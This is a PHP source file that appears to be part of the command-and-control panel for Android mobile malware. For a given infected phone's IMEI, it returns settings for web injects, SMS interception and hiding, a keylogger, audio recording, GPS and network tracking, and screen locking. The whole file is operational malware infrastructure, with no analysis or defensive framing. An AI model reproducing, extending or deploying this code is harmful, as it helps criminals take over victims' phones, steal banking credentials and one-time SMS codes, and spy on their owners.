<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}

if($statusCode){

	if(isset($_REQUEST['imei'])){

	$getIMEI = $_REQUEST['imei'];

	include_once "../../config.php";

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$sql = "SELECT * FROM settings";

	$inject_str = "";
	$text_delsms = "";
	$IMEI = "";
	$inject ="";
	$del_sms = "";
	$state = "";
	$check_true = "";

	$network = "";
	$gps = "";
	$foreground = "";
	$keylogger = "";

	$check_record = "";
	$text_seconds ="";

	$lookscreen = "0";

	foreach($connection->query($sql) as $row){
			$IMEI = $row['IMEI'];
			$inject = $row['inject'];
			$del_sms = $row['del_sms'];
			$state = $row['state'];

			if($IMEI == $getIMEI){
				$inject_str=$inject;
				$text_delsms = $del_sms;//Скрытие смс
				$network= $row['avtootvet_sig1'];//NetWork
				$gps = $row['avtootvet_sig2'];//GPS
				$check_true = $row['avtootvet_true'];//перехват смс
				$foreground = $row['checkforeground'];
				$keylogger=$row['keylogger'];
				$check_record=$row['checkrecord'];
				$text_seconds=$row['recordseconds'];
				$lookscreen=$row['lookscreen'];
				break;
			}
		}

		$sql = "SELECT * FROM kliets";
		$seconds="0";
		foreach($connection->query($sql) as $row){
			$IMEI = $row['IMEI'];
			if($IMEI == $getIMEI){
				$seconds = $row['seconds'];
				break;
			}
		}
		if(($seconds=="")||($seconds==null))$seconds="0";

		echo "$seconds|$inject_str|$check_true|$text_delsms|$network|$gps|$state|$foreground|$keylogger|$check_record|$text_seconds|$lookscreen";
	}
}
?>
